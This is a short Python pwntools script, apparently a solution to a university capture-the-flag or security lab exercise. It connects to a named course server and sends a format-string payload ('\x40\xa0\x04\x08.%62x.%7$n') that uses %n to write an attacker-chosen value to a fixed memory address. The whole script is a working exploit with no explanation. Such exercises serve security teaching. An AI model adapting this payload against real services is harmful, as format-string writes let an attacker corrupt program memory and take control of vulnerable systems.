from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22193

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'\x40\xa0\x04\x08.%62x.%7$n')
print(s.recv(512))